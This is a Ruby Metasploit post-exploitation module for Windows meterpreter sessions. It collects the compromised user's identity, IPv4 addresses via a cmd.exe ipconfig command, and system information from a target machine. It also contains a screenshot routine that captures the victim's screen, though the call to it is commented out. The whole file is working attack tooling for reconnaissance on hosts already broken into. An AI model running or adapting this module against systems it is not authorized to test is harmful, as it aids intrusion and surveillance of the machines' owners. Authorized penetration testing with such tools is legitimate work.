##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post

    def initialize(info = {})
      super(update_info(info,
        'Name'          => 'Three elements',
        'Description'   => %q(
            This module executes: getuid, ipconfig, sysinfo in batches.
        ),
        'License'       => MSF_LICENSE,
        'Author'        => 'AnonySec',
        'Platform'      => [ 'win' ],
        'SessionTypes'  => [ 'meterpreter' ]))

    end

    # /opt/metasploit-framework/embedded/framework/lib/rex/post/meterpreter/ui/console/command_dispatcher/stdapi/sys.rb
    def getuid(*args)
      print_line("Server username: #{client.sys.config.getuid}")
    end
    
    def ipconfig(*args)
        # session.net.config. 目标网络信息; each_interface 枚举网卡; interfaces 获取网卡信息
        # session.net.config.each_interface do |interface|
        # print_line(interface.addrs.to_s)
        # 中文乱码，英文输出 chcp 437
        ip = cmd_exec("cmd.exe /c chcp 437 && ipconfig |findstr IPv4")
        print_line ("#{ip}")

    end

    # /opt/metasploit-framework/embedded/framework/lib/rex/post/meterpreter/ui/console/command_dispatcher/stdapi/sys.rb
    def sysinfo(*args)
        info = client.sys.config.sysinfo(refresh: true)
        width = "Meterpreter".length
        info.keys.each { |k| width = k.length if k.length > width and info[k] }
    
        info.each_pair do |key, value|
          print_line("#{key.ljust(width+1)}: #{value}") if value
        end
        print_line("#{"Meterpreter".ljust(width+1)}: #{client.session_type}")
    
        return true
    end

    # /opt/metasploit-framework/embedded/framework/lib/rex/post/meterpreter/ui/console/command_dispatcher/stdapi/ui.rb
    def screenshot(*args)
      path    = Rex::Text.rand_text_alpha(8) + ".jpeg"
      quality = 50
      view    = false
  
      data = client.ui.screenshot(quality)
  
      if data
        ::File.open(path, 'wb') do |fd|
          fd.write(data)
        end
  
        path = ::File.expand_path(path)
  
        print_line("Screenshot saved to: #{path}")
  
        Rex::Compat.open_file(path) if view
      else
        print_error("No screenshot data was returned.")
        if client.platform == 'android'
          print_error("With Android, the screenshot command can only capture the host application. If this payload is hosted in an app without a user interface (default behavior), it cannot take screenshots at all.")
        end
      end
  
      return true
    end

    def run
      print_good ("Getuid")
      getuid

      print_good ("IPconfig")
      ipconfig

      print_good ("Sysinfo")
      sysinfo

      # print_good ("Screenshot")
      # screenshot
    end

end